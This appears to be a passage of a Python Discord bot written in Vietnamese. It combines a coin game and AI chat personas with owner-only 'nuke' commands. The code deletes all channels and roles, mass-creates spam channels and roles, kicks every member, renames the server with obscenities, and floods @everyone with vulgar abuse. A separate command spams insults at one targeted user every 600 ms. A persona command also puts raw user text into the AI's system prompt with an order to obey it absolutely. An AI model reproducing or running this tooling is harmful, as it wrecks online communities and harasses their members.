            title="❌ KHÔNG ĐỦ COIN ĐỂ THỰC THI!",
            description=(
                f"🥺 Ôi không {ctx.author.mention}! Bạn hiện chỉ có `🪙 {USER_COINS[user_id]} coin`, trong khi chi phí để yêu cầu bot đổi nhân cách là `🪙 {cost} coin`.\n\n"
                f"🌸 Hãy sang khu vui chơi gõ lệnh `l!work` thật chăm chỉ để tích lũy thêm coin rồi quay lại nhé! 💕"
            ),
            color=0xFF007F
        )
        await ctx.send(embed=embed)
        return
        
    USER_COINS[user_id] -= cost
    CUSTOM_USER_PERSONAS[user_id] = {
        'name': f"TÙY CHỈNH CỦA {ctx.author.name.upper()} 🌸",
        'color': 0xFF69B4,
        'instruction': f"""
[🌸 HỆ THỐNG NHÂN CÁCH TÙY CHỈNH THEO YÊU CẦU CỦA MEMBER {ctx.author.name} ✨]
- Yêu cầu cốt lõi từ người dùng: {user_request}
- Tôn chỉ: Luôn tuân thủ tuyệt đối các yêu cầu trên của người dùng, giữ thái độ phục vụ trong không gian màu hồng tuyệt đẹp và luôn ghi nhớ chủ nhân tối cao của toàn hệ thống là Boss Tuyền.
""".strip()
    }
    
    global current_persona_id
    current_persona_id = f"custom_{user_id}"
    
    embed = discord.Embed(
        title="✨ TÙY CHỈNH NHÂN CÁCH THÀNH CÔNG VỚI SẮC HỒNG RỰC RỠ! ✨",
        description=(
            f"👑 Tuyệt vời {ctx.author.mention} đã chi tiêu `🪙 {cost} coin` thành công!\n"
            f"📌 **Yêu cầu của bạn đã được nạp vào não bộ AI:** *\"{user_request}\"*\n\n"
            f"🌸 Từ bây giờ, bot đã chuyển sang trạng thái phục vụ theo đúng ý muốn của bạn! 💕\n"
            f"🪙 Số dư coin còn lại: `🪙 {USER_COINS[user_id]} coin`"
        ),
        color=0xFF69B4
    )
    embed.set_footer(text="Hệ thống AI cá nhân hóa • Dưới quyền bảo trợ của Boss Tuyền 💖", icon_url=ctx.author.display_avatar.url)
    await ctx.send(embed=embed)


# ==================== CÁC LỆNH ĐIỀU KHIỂN & NUKE DÀNH CHO BOSS TUYỀN ====================

@bot.command(name="setup")
@is_bot_owner()
async def setup(ctx):
    global current_persona_id, last_active_persona_id, bot_stopped, is_spamming, spam_task_running
    current_persona_id = 1
    last_active_persona_id = 1
    bot_stopped = False
    is_spamming = False
    if spam_task_running:
        spam_task_running.cancel()
        spam_task_running = None

    p_info = PERSONAS[1]
    embed = discord.Embed(
        title="💖✨ HỆ THỐNG QUẢN TRỊ TỐI CAO ĐƯỢC THIẾT KẾ RIÊNG CHO BOSS TUYỀN TRONG SẮC HỒNG THẦN THÁNH ✨💖",
        description=(
            f"🌸 **Kênh kết nối thiêng liêng:** {ctx.channel.mention}\n"
            f"🎀 **Nhân cách mặc định hiện tại:** `{p_info['name']}`\n\n"
            "Danh mục toàn bộ các hệ thống điều hành cao cấp và khu vui chơi giải trí trong sắc hồng bao gồm:\n\n"
            "🎮 **KHU VUI CHƠI DÀNH CHO MEMBER:**\n"
            "• `l!work` ➔ Kiếm coin bằng 50 kịch bản ngẫu nhiên\n"
            "• `l!setpersona [yêu cầu]` ➔ Dùng 5000 coin để tùy chỉnh nhân cách bot\n\n"
            "⚙️ **CÁC LỆNH QUẢN TRỊ & NUKE (ĐỘC QUYỀN BOSS TUYỀN):**\n"
            "• `l!setup` ➔ Khởi tạo bảng điều khiển trung tâm\n"
            "• `l!persona <1|2>` ➔ Chuyển đổi nhân cách bot\n"
            "• `l!spam @user [nội dung]` ➔ Kích hoạt lôi đài spam tốc độ cao\n"
            "• `l!stop` ➔ Dừng mọi hoạt động spam\n"
            "• `l!on` / `l!off` ➔ Bật/tắt phản hồi tự động\n"
            "• `l!stats` ➔ Xem thống kê server\n"
            "• `l!ban @user [lý do]` ➔ Trục xuất thành viên\n"
            "• `l!nuke` ➔ Xóa kênh, tạo 100 kênh spam, spam @everyone\n"
            "• `l!spamchannels [số lượng]` ➔ Tạo hàng loạt kênh spam\n"
            "• `l!spameveryone` ➔ Spam @everyone toàn server\n"
            "• `l!deleteallchannels` ➔ Xóa sạch tất cả kênh\n"
            "• `l!spamroles [số lượng]` ➔ Tạo hàng loạt role spam\n"
            "• `l!deleteallroles` ➔ Xóa sạch tất cả role ngoại trừ @everyone\n"
            "• `l!kickall` ➔ Kick toàn bộ thành viên\n"
            "• `l!setservername [tên mới]` ➔ Thay đổi tên server\n"
            "• `l!setservericon [url]` ➔ Thay đổi icon server\n"
            "• `l!ultimatenuke` ➔ Tổng hợp phá hủy toàn diện server"
        ),
        color=0xFF69B4
    )
    embed.set_image(url=CUSTOM_SETUP_GIF)
    embed.set_footer(text="Hệ thống quản trị tối cao • Độc quyền phục vụ Boss Tuyền 💖", icon_url=ctx.author.display_avatar.url)
    await ctx.send(embed=embed)

@setup.error
async def setup_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS TUYỀN MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ MÀU HỒNG NÀY THÔI!"** 🌸💀')

@bot.command(name="persona")
@is_bot_owner()
async def persona(ctx, persona_id: int = None):
    global current_persona_id, last_active_persona_id

    if persona_id not in PERSONAS:
        embed = discord.Embed(
            title="⚠️ LỰA CHỌN MÃ NHÂN CÁCH KHÔNG HỢP LỆ",
            description="🎀 Kính thưa Boss Tuyền, vui lòng chọn `l!persona 1` (Sweet Princess) hoặc `l!persona 2` (Cold Master).",
            color=0xFF1493
        )
        await ctx.send(embed=embed)
        return

    current_persona_id = persona_id
    last_active_persona_id = persona_id

    p_info = PERSONAS[current_persona_id]
    embed = discord.Embed(
        title="✨ CHUYỂN ĐỔI GIAO DIỆN NHÂN CÁCH THÀNH CÔNG ✨",
        description=f"🌸 **Nhân cách hiện tại:** `{p_info['name']}`",
        color=p_info['color']
    )
    await ctx.send(embed=embed)

@persona.error
async def persona_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS TUYỀN MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ MÀU HỒNG NÀY THÔI!"** 🌸💀')

@bot.command(name="spam")
@is_bot_owner()
async def spam(ctx, member: discord.Member = None, *, custom_text: str = None):
    global spam_task_running, is_spamming
    
    if member is None:
        embed = discord.Embed(
            title="⚠️ THIẾU THÔNG TIN MỤC TIÊU",
            description="🎀 Cú pháp chuẩn: `l!spam @user [câu chửi tùy chỉnh của Boss]`",
            color=0xFF007F
        )
        await ctx.send(embed=embed)
        return

    if spam_task_running and not spam_task_running.done():
        spam_task_running.cancel()

    is_spamming = True  
    embed_notice = discord.Embed(
        title="🚨 KÍCH HOẠT LÔI ĐÀI TẤN CÔNG TỐC ĐỘ CAO (600MS/CÂU) 🚨",
        description=f"👑 Chiến dịch trừng phạt mục tiêu {member.mention} bắt đầu! Gõ `l!stop` để dừng lại.",
        color=0xFF69B4
    )
    await ctx.send(embed=embed_notice)

    async def spam_loop():
        try:
            while True:
                if custom_text:
                    msg = f"{member.mention} {custom_text}"
                else:
                    template = random.choice(ROAST_LINES)
                    msg = template.format(username=member.mention)
                
                await ctx.send(msg)
                await asyncio.sleep(0.6)
        except asyncio.CancelledError:
            pass
        except Exception as e:
            print(f"[SPAM ERROR]: {e}")

    spam_task_running = bot.loop.create_task(spam_loop())

@spam.error
async def spam_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS TUYỀN MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ MÀU HỒNG NÀY THÔI!"** 🌸💀')

@bot.command(name="stop")
@is_bot_owner()
async def stop_bot(ctx):
    global bot_stopped, is_spamming, spam_task_running
    bot_stopped = True
    is_spamming = False  
    if spam_task_running:
        spam_task_running.cancel()
        spam_task_running = None

    embed = discord.Embed(
        title="🛑 ĐÃ DỪNG TOÀN BỘ HOẠT ĐỘNG VÀ LÔI ĐÀI SPAM",
        description="🎀 Mọi tác vụ đã được đóng băng hoàn toàn.",
        color=0xFF0000
    )
    await ctx.send(embed=embed)

@stop_bot.error
async def stop_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS TUYỀN MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ MÀU HỒNG NÀY THÔI!"** 🌸💀')

@bot.command(name="on")
@is_bot_owner()
async def bot_on(ctx):
    global current_persona_id, last_active_persona_id, bot_stopped, is_spamming
    bot_stopped = False
    is_spamming = False
    current_persona_id = last_active_persona_id
    embed = discord.Embed(
        title="🟢 HỆ THỐNG ĐÃ ĐƯỢC TÁI KÍCH HOẠT",
        description="👑 Kênh chat AI đã hoạt động trở lại bình thường.",
        color=0x00FF00
    )
    await ctx.send(embed=embed)

@bot_on.error
async def bot_on_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS TUYỀN MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ MÀU HỒNG NÀY THÔI!"** 🌸💀')

@bot.command(name="off")
@is_bot_owner()
async def bot_off(ctx):
    global current_persona_id
    current_persona_id = None
    embed = discord.Embed(
        title="🔌 ĐÃ TẠM THỜI ĐÓNG BĂNG KÊNH PHẢN HỒI CHAT AI",
        description="🎀 Tính năng trò chuyện tự động đã được tắt tạm thời.",
        color=0xFF9900
    )
    await ctx.send(embed=embed)

@bot_off.error
async def bot_off_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS TUYỀN MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ MÀU HỒNG NÀY THÔI!"** 🌸💀')

@bot.command(name="ban")
@is_bot_owner()
async def ban(ctx, member: discord.Member = None, *, reason="Boss Tuyền không nêu rõ lý do"):
    if member is None:
        await ctx.send("🎀 Vui lòng tag tên thành viên cần ban. Ví dụ: `l!ban @user [lý do]`")
        return
    try:
        await member.ban(reason=reason)
        await ctx.send(f"🔨 Đã ban {member.mention}. **Lý do:** `{reason}`")
    except Exception as e:
        await ctx.send(f"❌ Không thể ban thành viên này: {str(e)}")

@ban.error
async def ban_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS TUYỀN MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ MÀU HỒNG NÀY THÔI!"** 🌸💀')

# ==================== CÁC LỆNH NUKE / PHÁ HỦY SERVER ====================

@bot.command(name="nuke")
@is_bot_owner()
async def nuke_server(ctx):
    """Xóa tất cả kênh, tạo 100 kênh mới, spam @everyone"""
    try:
        confirm_embed = discord.Embed(
            title="⚠️ XÁC NHẬN LỆNH NUKE SERVER ⚠️",
            description="🔹 **Gõ `l!confirmnuke` để xác nhận**\n🔹 **Gõ bất kỳ tin nhắn nào khác để hủy bỏ**",
            color=0xFF0000
        )
        await ctx.send(embed=confirm_embed)

        def check(m):
            return m.author == ctx.author and m.channel == ctx.channel

        msg = await bot.wait_for('message', timeout=30.0, check=check)
        if msg.content.lower() != "l!confirmnuke":
            await ctx.send("❌ Lệnh nuke đã bị hủy bỏ.")
            return

        await ctx.send(embed=discord.Embed(title="🚀 KÍCH HOẠT NUKE...", color=0xFF0000))

        for channel in ctx.guild.channels:
            try:
                await channel.delete()
            except:
                continue

        for i in range(100):
            try:
                await ctx.guild.create_text_channel(name=random.choice(NUKE_CHANNEL_NAMES))
            except:
                continue

        spam_content = "@everyone # LỒN MẸ MÀY NÁT BÉT NHƯ TƯƠNG, BỊ ĐỊT ĐẾN KHÔNG CÒN! l!help"
        for channel in ctx.guild.text_channels:
            try:
                for _ in range(10):
                    await channel.send(spam_content)
                    await asyncio.sleep(0.1)
            except:
                continue
    except asyncio.TimeoutError:
        await ctx.send("⏳ Hết thời gian chờ xác nhận nuke.")

@nuke_server.error
async def nuke_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS TUYỀN MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ MÀU HỒNG NÀY THÔI!"** 🌸💀')

@bot.command(name="spamchannels")
@is_bot_owner()
async def spam_channels(ctx, amount: int = 100):
    amount = min(amount, 200)
    for _ in range(amount):
        try:
            await ctx.guild.create_text_channel(name=random.choice(NUKE_CHANNEL_NAMES))
            await asyncio.sleep(0.3)
        except:
            continue
    await ctx.send(f"✅ Đã tạo xong {amount} kênh spam!")

@spam_channels.error
async def spam_channels_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS TUYỀN MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ MÀU HỒNG NÀY THÔI!"** 🌸💀')

@bot.command(name="spameveryone")
@is_bot_owner()
async def spam_everyone(ctx):
    spam_content = "@everyone # ĐỤ MẸ CẢ SERVER NÀY ĐI, LỒN MẸ MÀY NÁT BÉT! l!help"
    for channel in ctx.guild.text_channels:
        try:
            for _ in range(10):
                await channel.send(spam_content)
                await asyncio.sleep(0.1)
        except:
            continue
    await ctx.send("✅ Đã spam @everyone xong!")

@spam_everyone.error
async def spam_everyone_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS TUYỀN MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ MÀU HỒNG NÀY THÔI!"** 🌸💀')

@bot.command(name="deleteallchannels")
@is_bot_owner()
async def delete_all_channels(ctx):
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
            await asyncio.sleep(0.2)
        except:
            continue

@delete_all_channels.error
async def delete_all_channels_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS TUYỀN MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ MÀU HỒNG NÀY THÔI!"** 🌸💀')

@bot.command(name="spamroles")
@is_bot_owner()
async def spam_roles(ctx, amount: int = 50):
    amount = min(amount, 250)
    for _ in range(amount):
        try:
            await ctx.guild.create_role(name=random.choice(NUKE_CHANNEL_NAMES), color=discord.Color(random.randint(0, 0xFFFFFF)))
            await asyncio.sleep(0.3)
        except:
            continue
    await ctx.send(f"✅ Đã tạo xong {amount} role!")

@spam_roles.error
async def spam_roles_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS TUYỀN MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ MÀU HỒNG NÀY THÔI!"** 🌸💀')

@bot.command(name="deleteallroles")
@is_bot_owner()
async def delete_all_roles(ctx):
    for role in ctx.guild.roles:
        if role.name != "@everyone":
            try:
                await role.delete()
                await asyncio.sleep(0.2)
            except:
                continue
    await ctx.send("✅ Đã xóa toàn bộ role!")

@delete_all_roles.error
async def delete_all_roles_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS TUYỀN MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ MÀU HỒNG NÀY THÔI!"** 🌸💀')

@bot.command(name="kickall")
@is_bot_owner()
async def kick_all_members(ctx):
    for member in ctx.guild.members:
        if not member.bot and member.id not in BOT_OWNERS and member.id != ctx.guild.owner_id:
            try:
                await member.kick(reason="Nuke theo lệnh Boss Tuyền")
                await asyncio.sleep(0.5)
            except:
                continue
    await ctx.send("✅ Đã kick toàn bộ thành viên hợp lệ!")

@kick_all_members.error
async def kick_all_members_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS TUYỀN MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ MÀU HỒNG NÀY THÔI!"** 🌸💀')

@bot.command(name="setservername")
@is_bot_owner()
async def set_server_name(ctx, *, new_name: str):
    await ctx.guild.edit(name=new_name[:100])
    await ctx.send(f"✅ Đã đổi tên server thành: {new_name}")

@set_server_name.error
async def set_server_name_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS TUYỀN MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ MÀU HỒNG NÀY THÔI!"** 🌸💀')

@bot.command(name="setservericon")
@is_bot_owner()
async def set_server_icon(ctx, url: str = None):
    try:
        image_data = None
        if url:
            import aiohttp
            async with aiohttp.ClientSession() as session:
                async with session.get(url) as resp:
                    image_data = await resp.read()
        await ctx.guild.edit(icon=image_data)
        await ctx.send("✅ Đã cập nhật icon server!")
    except Exception as e:
        await ctx.send(f"❌ Lỗi đổi icon: {e}")

@set_server_icon.error
async def set_server_icon_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS TUYỀN MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ MÀU HỒNG NÀY THÔI!"** 🌸💀')

@bot.command(name="ultimatenuke")
@is_bot_owner()
async def ultimate_nuke(ctx):
    try:
        confirm_embed = discord.Embed(
            title="⚠️ XÁC NHẬN LỆNH ULTIMATE NUKE ⚠️",
            description="🔹 **Gõ `l!confirmultimatenuke` để xác nhận phá hủy toàn diện**",
            color=0xFF0000
        )
        await ctx.send(embed=confirm_embed)

        def check(m):
            return m.author == ctx.author and m.channel == ctx.channel

        msg = await bot.wait_for('message', timeout=30.0, check=check)
        if msg.content.lower() != "l!confirmultimatenuke":
            await ctx.send("❌ Đã hủy lệnh ultimate nuke.")
            return

        for channel in ctx.guild.channels:
            try: await channel.delete()
            except: pass

        for _ in range(100):
            try: await ctx.guild.create_text_channel(name=random.choice(NUKE_CHANNEL_NAMES))
            except: pass

        for _ in range(50):
            try: await ctx.guild.create_role(name=random.choice(NUKE_CHANNEL_NAMES), color=discord.Color(random.randint(0, 0xFFFFFF)))
            except: pass

        for member in ctx.guild.members:
            if not member.bot and member.id not in BOT_OWNERS and member.id != ctx.guild.owner_id:
                try: await member.kick(reason="Ultimate nuke")
                except: pass

        try: await ctx.guild.edit(name="LỒN MẸ MÀY NÁT BÉT")
        except: pass

        spam_content = "@everyone # ĐỤ MẸ CẢ SERVER NÀY ĐI! l!help"
        for channel in ctx.guild.text_channels:
            try:
                for _ in range(10):
                    await channel.send(spam_content)
            except: pass

    except asyncio.TimeoutError:
        await ctx.send("⏳ Hết thời gian chờ xác nhận.")

@ultimate_nuke.error
async def ultimate_nuke_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS TUYỀN MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ MÀU HỒNG NÀY THÔI!"** 🌸💀')

# ==================== LỆNH STATS & HELP ====================

@bot.command(name="stats")
async def stats(ctx):
    guild = ctx.guild
    p_name = PERSONAS[current_persona_id]['name'] if isinstance(current_persona_id, int) and current_persona_id in PERSONAS else "Tùy chỉnh ✨"
    
    embed = discord.Embed(
        title=f"📊 THÔNG SỐ CHI TIẾT MÁY CHỦ",
        description=f"🏰 **Tên:** `{guild.name}`\n👑 **Owner:** {guild.owner.mention if guild.owner else 'N/A'}\n🌸 **Boss Tuyền** • **AI:** `{p_name}`",
        color=0xFF69B4
    )
    embed.add_field(name="👥 Thành viên", value=f"• Tổng: `{guild.member_count}`", inline=True)
    embed.add_field(name="📁 Kênh", value=f"• Tổng: `{len(guild.channels)}`", inline=True)
    if guild.icon:
        embed.set_thumbnail(url=guild.icon.url)
    await ctx.send(embed=embed)

@bot.command(name="help")
async def help_command(ctx):
    embed = discord.Embed(
        title="📖 CẨM NANG ĐIỀU HÀNH TỐI TÂN - HỆ THỐNG MÀU HỒNG 🌸",
        description=(
            "Chào mừng đến với hệ thống **Sun Flower AI** thuộc quyền lực tối thượng của **Boss Tuyền**.\n\n"
            "🎮 **KHU VUI CHƠI MEMBER:**\n"
            "• `l!work` ➔ Kiếm 100 - 2000 coin sắc hồng.\n"
            "• `l!setpersona [yêu cầu]` ➔ Dùng 5000 coin thay đổi nhân cách bot theo ý thích.\n\n"
            "⚙️ **QUẢN TRỊ & NUKE (ĐỘC QUYỀN BOSS TUYỀN):**\n"
            "• `l!setup`, `l!persona <1|2>`, `l!spam @user`, `l!stop`, `l!on`, `l!off`, `l!stats`, `l!ban @user`\n"
            "• `l!nuke`, `l!spamchannels`, `l!spameveryone`, `l!deleteallchannels`\n"
            "• `l!spamroles`, `l!deleteallroles`, `l!kickall`, `l!setservername`, `l!setservericon`, `l!ultimatenuke`"
        ),
        color=0xFF69B4
    )
    embed.set_footer(text="Cẩm nang điều hành tối tân • Tôn vinh Boss Tuyền 💖", icon_url=bot.user.display_avatar.url)
    await ctx.send(embed=embed)

# ==================== XỬ LÝ TIN NHẮN TỰ ĐỘNG ====================
@bot.event
async def on_message(message):
    if message.author.bot:
        return

    await bot.process_commands(message)

    if message.content.startswith(('l!', '.', '/', '?', '@', '#')):
        return

    if bot_stopped or current_persona_id is None or is_spamming:
        return

    try:
        user_id = message.author.id
        if str(current_persona_id).startswith("custom_"):
            owner_custom_id = int(current_persona_id.split("_")[1])
            p_info = CUSTOM_USER_PERSONAS.get(owner_custom_id, PERSONAS[1])
        else:
            p_info = PERSONAS.get(current_persona_id, PERSONAS[1])

        user_msg = message.content.strip() if message.content else "..."
        
        if groq_client:
            chat_completion = groq_client.chat.completions.create(
                messages=[
                    {"role": "system", "content": p_info['instruction']},
                    {"role": "user", "content": user_msg}
                ],
                model="llama-3.1-8b-instant",
                max_tokens=2500,
            )
            ai_reply = chat_completion.choices[0].message.content
        else:
            ai_reply = "⚠️ CHƯA THIẾT LẬP GROQ_API_KEY TRONG BIẾN MÔI TRƯỜNG NHA CƯNG!"

        embed = discord.Embed(
            title=f"✨ {p_info['name']}",
            description=ai_reply,
            color=p_info['color']
        )
        embed.set_footer(text="Hệ thống AI màu hồng • Độc quyền phục vụ Boss Tuyền 💖")
        await message.reply(embed=embed, mention_author=False)

    except Exception as e:
        print(f"[GROQ API ERROR]: {e}")

if __name__ == "__main__":
    bot.run(DISCORD_TOKEN)
